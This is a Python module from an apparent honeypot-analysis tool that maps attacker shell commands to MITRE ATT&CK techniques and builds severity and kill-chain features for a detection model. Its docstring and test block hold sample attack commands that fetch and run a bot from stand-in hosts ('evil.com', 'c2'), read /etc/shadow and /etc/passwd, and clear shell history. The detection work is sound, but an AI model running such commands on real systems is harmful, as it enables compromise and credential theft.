"""
MITRE ATT&CK Session Annotator for AdaptiveShield.

Takes a session's commands and produces structured threat intelligence features
by matching against the attack_mapping knowledge base.

OUTPUT PER SESSION:
  1. Tactic vector (14 dimensions) - count of matched techniques per ATT&CK tactic
  2. Severity scores - max, mean, weighted (higher weight to more severe matches)
  3. Kill chain score - how many distinct attack phases are present (0-14)
  4. Unique technique count - breadth of ATT&CK coverage in the session
  5. Technique IDs - list of all matched T-numbers
  6. Detailed matches - per-command breakdown (which command matched what)

WHY THIS EXISTS:
The original model used TF-IDF character n-grams which have zero semantic
understanding. A session running "cat /etc/shadow && wget http://c2/bot && crontab -e"
was just a bag of characters. Now it becomes:
  - tactic_credential_access = 1 (T1552.001)
  - tactic_command_and_control = 1 (T1105)
  - tactic_persistence = 1 (T1053.003)
  - max_severity = 8
  - kill_chain_score = 3 (three distinct phases)

This transforms opaque text into structured threat intelligence features.

AGGREGATION STRATEGY:
- Per command: ALL matching patterns fire (a command can be multi-technique)
- Per session: Union of all per-command matches
- Tactic counts: Number of UNIQUE techniques per tactic (not raw pattern matches)
  to avoid inflating counts when multiple patterns match the same technique
- Severity: Max and mean across all matched techniques (not patterns)
"""

from core.mitre.attack_mapping import (
    ATTACK_PATTERNS,
    TACTIC_NAMES,
    TACTICS,
    BINARY_TAG_TO_TECHNIQUE,
    severity_to_tier,
)


def annotate_command(command):
    """
    Annotate a single command string with ATT&CK technique matches.

    Parameters
    ----------
    command : str
        A single command string (e.g., "cat /etc/shadow")

    Returns
    -------
    list of dict
        Each dict has: technique_id, technique_name, tactic, severity, description
        Empty list if no patterns matched.
    """
    if not command or not command.strip():
        return []

    matches = []
    seen_techniques = set()  # Dedupe by technique_id per command

    for pattern in ATTACK_PATTERNS:
        if pattern["_compiled"].search(command):
            tid = pattern["technique_id"]
            if tid not in seen_techniques:
                seen_techniques.add(tid)
                matches.append({
                    "technique_id": tid,
                    "technique_name": pattern["technique_name"],
                    "tactic": pattern["tactic"],
                    "severity": pattern["severity"],
                    "description": pattern["description"],
                })

    return matches


def annotate_session(commands, binary_tags=None):
    """
    Annotate an entire session (list of commands) with ATT&CK features.

    This is the main entry point for the export pipeline. It produces all
    the structured features needed for the neural model.

    Parameters
    ----------
    commands : list of str
        All commands executed in the session, in order.
    binary_tags : list of str, optional
        Binary analysis tags for any binaries downloaded in this session
        (e.g., ["mining", "botnet", "persistence"]). These add additional
        ATT&CK technique matches from the binary analysis.

    Returns
    -------
    dict with keys:
        tactic_vector : dict
            {tactic_name: count_of_unique_techniques} for all 14 tactics
        severity_max : int
            Maximum severity across all matched techniques (0 if no matches)
        severity_mean : float
            Mean severity across all matched techniques (0.0 if no matches)
        severity_weighted : float
            Sum of severity^2 / total_matches (emphasizes high-severity)
        kill_chain_score : int
            Number of distinct tactics with at least one match (0-14)
        unique_technique_count : int
            Total number of unique techniques matched
        technique_ids : list of str
            Sorted list of unique technique IDs
        total_commands : int
            Total commands in the session
        matched_commands : int
            Number of commands that matched at least one pattern
        severity_tier : str
            Human-readable tier ("low", "medium", "high", "critical", "emergency")
        per_command_matches : list of list
            For each command, list of matched technique_ids (sparse representation)
    """
    if not commands:
        return _empty_annotation()

    # --- Per-command matching ---
    all_technique_matches = {}  # technique_id -> {technique details + max_severity}
    tactic_techniques = {}      # tactic -> set of technique_ids
    per_command = []
    matched_command_count = 0

    for cmd in commands:
        cmd_matches = annotate_command(cmd)
        cmd_technique_ids = []

        if cmd_matches:
            matched_command_count += 1

        for m in cmd_matches:
            tid = m["technique_id"]
            tactic = m["tactic"]
            cmd_technique_ids.append(tid)

            # Track unique techniques with max severity
            if tid not in all_technique_matches or m["severity"] > all_technique_matches[tid]["severity"]:
                all_technique_matches[tid] = m

            # Track techniques per tactic
            if tactic not in tactic_techniques:
                tactic_techniques[tactic] = set()
            tactic_techniques[tactic].add(tid)

        per_command.append(cmd_technique_ids)

    # --- Add binary tag matches ---
    if binary_tags:
        for tag in binary_tags:
            tag_lower = tag.lower()
            if tag_lower in BINARY_TAG_TO_TECHNIQUE:
                for bt in BINARY_TAG_TO_TECHNIQUE[tag_lower]:
                    tid = bt["technique_id"]
                    tactic = bt["tactic"]

                    if tid not in all_technique_matches or bt["severity"] > all_technique_matches[tid]["severity"]:
                        all_technique_matches[tid] = bt

                    if tactic not in tactic_techniques:
                        tactic_techniques[tactic] = set()
                    tactic_techniques[tactic].add(tid)

    # --- Build tactic vector ---
    tactic_vector = {}
    for tactic_name in TACTIC_NAMES:
        tactic_vector[tactic_name] = len(tactic_techniques.get(tactic_name, set()))

    # --- Severity metrics ---
    severities = [m["severity"] for m in all_technique_matches.values()]

    if severities:
        sev_max = max(severities)
        sev_mean = sum(severities) / len(severities)
        sev_weighted = sum(s * s for s in severities) / len(severities)
    else:
        sev_max = 0
        sev_mean = 0.0
        sev_weighted = 0.0

    # --- Kill chain score ---
    kill_chain_score = sum(1 for v in tactic_vector.values() if v > 0)

    return {
        "tactic_vector": tactic_vector,
        "severity_max": sev_max,
        "severity_mean": round(sev_mean, 3),
        "severity_weighted": round(sev_weighted, 3),
        "kill_chain_score": kill_chain_score,
        "unique_technique_count": len(all_technique_matches),
        "technique_ids": sorted(all_technique_matches.keys()),
        "total_commands": len(commands),
        "matched_commands": matched_command_count,
        "severity_tier": severity_to_tier(sev_max) if severities else "none",
        "per_command_matches": per_command,
    }


def _empty_annotation():
    """Return an empty annotation for sessions with no commands."""
    tactic_vector = {t: 0 for t in TACTIC_NAMES}
    return {
        "tactic_vector": tactic_vector,
        "severity_max": 0,
        "severity_mean": 0.0,
        "severity_weighted": 0.0,
        "kill_chain_score": 0,
        "unique_technique_count": 0,
        "technique_ids": [],
        "total_commands": 0,
        "matched_commands": 0,
        "severity_tier": "none",
        "per_command_matches": [],
    }


def annotation_to_flat_dict(annotation, prefix="mitre_"):
    """
    Flatten an annotation dict into a single-level dict suitable for CSV export.

    The tactic_vector becomes individual columns:
        mitre_tactic_discovery, mitre_tactic_execution, etc.
    Other fields get the prefix directly:
        mitre_severity_max, mitre_kill_chain_score, etc.

    Parameters
    ----------
    annotation : dict
        Output of annotate_session()
    prefix : str
        Prefix for all column names (default "mitre_")

    Returns
    -------
    dict : flat key-value pairs, all values are numeric or string
    """
    flat = {}

    # Tactic vector columns
    for tactic_name, count in annotation["tactic_vector"].items():
        flat[prefix + "tactic_" + tactic_name] = count

    # Scalar features
    flat[prefix + "severity_max"] = annotation["severity_max"]
    flat[prefix + "severity_mean"] = annotation["severity_mean"]
    flat[prefix + "severity_weighted"] = annotation["severity_weighted"]
    flat[prefix + "kill_chain_score"] = annotation["kill_chain_score"]
    flat[prefix + "unique_technique_count"] = annotation["unique_technique_count"]
    flat[prefix + "total_commands"] = annotation["total_commands"]
    flat[prefix + "matched_commands"] = annotation["matched_commands"]

    # String fields (for reference, not ML features)
    flat[prefix + "severity_tier"] = annotation["severity_tier"]
    flat[prefix + "technique_ids"] = "|".join(annotation["technique_ids"])

    return flat


def get_mitre_feature_columns(prefix="mitre_"):
    """
    Return the ordered list of numeric MITRE feature column names.

    These are the columns that should be used as ML features.
    String columns (severity_tier, technique_ids) are excluded.

    Returns
    -------
    list of str : column names in deterministic order
    """
    cols = []
    for tactic_name in TACTIC_NAMES:
        cols.append(prefix + "tactic_" + tactic_name)
    cols.extend([
        prefix + "severity_max",
        prefix + "severity_mean",
        prefix + "severity_weighted",
        prefix + "kill_chain_score",
        prefix + "unique_technique_count",
        prefix + "total_commands",
        prefix + "matched_commands",
    ])
    return cols


# ===================================================================
# Batch annotation
# ===================================================================

def annotate_sessions_batch(sessions, verbose=True):
    """
    Annotate a list of session dicts (from correlate_downloads_from_logs).

    Parameters
    ----------
    sessions : list of dict
        Each dict must have "commands" (list of str).
        Optionally "binary_features" with "binary_tags" (list of str).

    Returns
    -------
    list of dict
        Same sessions, each with an "mitre_annotation" key added.
    """
    total = len(sessions)
    annotated_count = 0

    for i, session in enumerate(sessions):
        commands = session.get("commands", [])

        # Get binary tags if available
        bf = session.get("binary_features", {})
        binary_tags = bf.get("binary_tags", []) if isinstance(bf, dict) else []

        annotation = annotate_session(commands, binary_tags=binary_tags)
        session["mitre_annotation"] = annotation

        if annotation["matched_commands"] > 0:
            annotated_count += 1

        if verbose and (i + 1) % 10000 == 0:
            print("  Annotated %d / %d sessions..." % (i + 1, total))

    if verbose:
        print("MITRE annotation complete: %d / %d sessions had at least one match (%.1f%%)" % (
            annotated_count, total, 100.0 * annotated_count / total if total > 0 else 0))

    return sessions


if __name__ == "__main__":
    # Quick test with sample commands
    test_commands = [
        "uname -a",
        "cat /etc/passwd",
        "wget http://evil.com/bot && chmod +x bot && ./bot",
        "crontab -e",
        "history -c",
    ]

    print("=" * 60)
    print("MITRE ATT&CK Session Annotator — Test")
    print("=" * 60)

    for cmd in test_commands:
        matches = annotate_command(cmd)
        if matches:
            for m in matches:
                print("  [%s] %s -> %s (%s, severity %d)" % (
                    m["tactic"], cmd[:40], m["technique_id"], m["technique_name"], m["severity"]))
        else:
            print("  [no match] %s" % cmd)

    print("\n--- Full session annotation ---")
    annotation = annotate_session(test_commands, binary_tags=["mining", "botnet"])
    print("  Tactic vector: %s" % annotation["tactic_vector"])
    print("  Max severity: %d (%s)" % (annotation["severity_max"], annotation["severity_tier"]))
    print("  Kill chain score: %d / 14" % annotation["kill_chain_score"])
    print("  Unique techniques: %d" % annotation["unique_technique_count"])
    print("  Techniques: %s" % annotation["technique_ids"])
    print("  Commands matched: %d / %d" % (annotation["matched_commands"], annotation["total_commands"]))

    print("\n--- Flat dict for CSV ---")
    flat = annotation_to_flat_dict(annotation)
    for k, v in sorted(flat.items()):
        print("  %s = %s" % (k, v))

    print("\n--- ML feature columns (%d) ---" % len(get_mitre_feature_columns()))
    for col in get_mitre_feature_columns():
        print("  %s" % col)
